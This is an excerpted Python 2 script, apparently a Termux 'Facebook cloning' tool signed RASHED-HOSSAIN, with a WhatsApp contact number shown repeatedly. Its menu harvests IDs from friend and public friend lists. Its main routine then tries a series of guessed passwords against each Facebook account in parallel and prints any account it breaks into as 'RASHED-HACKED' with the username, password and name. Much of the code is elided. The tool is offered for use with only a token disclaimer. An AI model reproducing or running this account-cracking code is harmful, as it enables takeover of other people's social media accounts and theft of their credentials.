...
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mWHATSAPP +27618543540█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:RASHED-HOSSAIN
	    time.sleep(2)
            loop = 'false'
        else:
...
def login():
	...
	print "\033[1;91m[1]\033[1;95mLogin With Facebook"
        ...
        time.sleep(0.05)
        print "\033[1;95m[4]\033[1;95mFollowing my Facebook account For Help"
        time.sleep(0.05)
...
def login1():
	...
	try:
		...
		os.system('clear')
                time.sleep(0.05)
		print logo                
		print "\033[1;98m•-----------------\033[1;98mRASHED-HOSSAIN\033[1;98m-----------------•"
		...
		if 'save-device' in url:
			try:
				...
				unikers.close()
				print '\033[1;47m\033[1;94mRASHED-HOSSAINLogin Successful\033[1;0m'
				os.system('xdg-open https://www.facebook.com/Wwwwwwwwwwww.Mizan.Vau8080')
...
def menu():
	...
	try:
		...
		keluar()
	os.system("clear") #Dev:RASHED-HOSSAIN
	print logo
	...
	time.sleep(0.05)
	print "\033[1;98m•-----------------\033[1;94mRASHED-HOSSAIN\033[1;98m-----------------•"
	print "\033[1;92m[1]\033[1;34mStart Fast Cloning"
	time.sleep(0.05)
	print "\033[1;93m[2]\033[1;34mID Not Found Problem Solve"
	time.sleep(0.05)
	print "\033[1;94m[3]\033[1;34mRest/Update RASHED-HOSSAIN TOOL"
	time.sleep(0.05)
...
def pilih():
	...
	if unikers =="":
		...
		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
                ...
                jalan('\033[1;93mCloning Data Reset and update by RASHED-HOSSAIN')
...
def pilih():
	...
	if unikers =="":
		...
		print logo
		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
                jalan('\033[1;91m=NAME 💃RASHED HOSSAIN')
                jalan("\033[1;92m==CYBER NAME 🕵HAT-HACKERS")
                jalan('\033[1;93m===WHATSAPP 👬 +27618543540')
                jalan('\033[1;94m====WARNING ✊ DON,T CALL ME ONLY TEXT')
                jalan("\033[1;95m=====NOTE 👉 USE FAST 4G SIM NET")
                jalan("\033[1;96m======NOTE 📚 USE 4G NETWORK AND 6GB RAM MOBILE")
                jalan('\033[1;97m=======SLOGAN 🎷 BE HELPFULL TO OUTHERS')
                jalan('\033[1;96m========FUNNY LINE 😂 I M INNOCENT PERSON')
                jalan('\033[1;95m=========💓1ST CLEAR MEMORY TERMUX DATA ')
                jalan('\033[1;94m==========DON’T USE ILLEGAL WAY💓')
                jalan('\033[1;93mCloning Data Reset and update by RASHED-HOSSAIN')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	        menu()		
...
def super():
	...
	os.system('clear')
	print logo
	print "\033[1;91m[1]\033[1;94mClone From Friend List"
	time.sleep(0.05)
	print "\033[1;92m[2]\033[1;94mClone From Public  friend list"
	time.sleep(0.05)
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print "\033[1;98m•-----------------\033[1;34mRASHED-HOSSAIN\033[1;98m-----------------•"
		print logo
		jalan('\033[1;91m[+]\033[1;98mWHATSAPP +27618543540█████████████████▒▒▒▒▒▒▒▒..99%')
		...
		os.system('clear')
		print "\033[1;98m•-----------------\033[1;35mWHATSAPP +27618543540\033[1;98m-----------------•"
		print logo
		...
		try:
			...
			super()
		print"\033[1;98m[+]\033[1;94mRASHED-HOSSAIN█████████████████▒▒▒▒▒▒▒▒..100"
	...
	def main(arg):
		...
		try:													
			...
			if 'access_token' in q:
				print '\033[1;94m[RASHED-HACKED] \033[1;94m ' + user  + ' \033[1;94m | \033[1;94m ' + pass1 + ' 🐞 ' + b['name']
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;94m[RASHED-HACKED] \033[1;94m ' + user  + ' \033[1;98m | \033[1;94m ' + pass2 + '🐞' + b['name']
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;94m[RASHED-HACKED] \033[1;94m ' + user  + ' \033[1;94m | \033[1;94m ' + pass3 + ' 🐞 ' + b['name']
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;94m[RASHED-HACKED] \033[1;94m ' + user  + ' \033[1;94m | \033[1;94m ' + pass4 + ' 🐞 ' + b['name']
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;94m[RASHED-HACKED] \033[1;94m ' + user  + ' \x1b[1;36;94m|\033[1;94m ' + pass5 + ' 🐞 ' + b['name']
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;94m[RASHED-HACKED] \033[1;94m ' + user  + ' \x1b[1;36;94m|\033[1;94m ' + pass6 + ' 🐞 ' + b['name']
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;98m[RASHED-HACKED] \033[1;94m ' + user  + ' \x1b[1;36;40m|\033[1;94m ' + pass4 + ' 🐞 ' + b['name']
	...
	p.map(main, id)
#Dev:RASHED-HOSSAIN
        print "\033[1;98m•-----------------\033[1;38mBE-HAPPY\033[1;98m-----------------•"
	...
	print "\033[1;98m«-----------------\033[1;38mWHATSAPP +27618543540\033[1;98m-----------------»"
	print """
 💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
...
"""
	print "\033[1;95m«-----------------\033[1;35m✅RASHED-HOSSAIN✅\033[1;95m-----------------»"
